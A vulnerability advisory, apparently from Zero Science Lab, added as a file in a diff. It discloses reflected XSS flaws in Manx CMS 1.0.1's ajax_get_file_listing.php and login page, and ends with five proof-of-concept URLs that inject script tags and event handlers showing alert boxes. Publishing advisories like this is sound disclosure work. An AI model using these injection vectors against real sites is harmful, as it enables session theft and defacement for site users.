@@ -1,0 +1,41 @@
+
+Manx cms.xml 1.0.1 (ajax_get_file_listing.php) Multiple XSS Vulnerabilities
+
+
+Vendor: Paul Jova
+Product web page: http://manx.jovascript.com
+Affected version: 1.0.1
+
+Summary: Manx is a Content Management System that uses xml text
+files to store the page contents, instead of a mysql database.
+
+Desc: Input thru the GET parameters 'limit' and 'search_folder'
+in 'ajax_get_file_listing.php' are not sanitized allowing the
+attacker to execute HTML code into user's browser session on
+the affected site.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.21
+           MySQL 5.5.16
+           PHP 5.3.8
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2011-5058
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5058.php
+
+
+
+27.11.2011
+
+--
+
+
+http://localhost/admin/login.php/%22onmouseover=prompt%28%27All_He_Wanted_Was_Some_Mu_Shu%27%29%3E
+http://localhost/admin/tiny_mce/plugins/ajaxfilemanager/ajax_get_file_listing.php?limit="><script>alert(1)</script>
+http://localhost/admin/tiny_mce/plugins/ajaxfilemanager/ajax_get_file_listing.php?limit=5&search=1&search_folder=</script><script>alert(1)</script>Waddup Thricer!
+http://localhost/admin/tiny_mce/plugins/ajaxfilemanager_old/ajax_get_file_listing.php?limit="><script>alert(1)</script>
+http://localhost/admin/tiny_mce/plugins/ajaxfilemanager_old/ajax_get_file_listing.php?limit=5&search=1&search_folder=</script><script>alert(1)</script>Waddup Thricer!
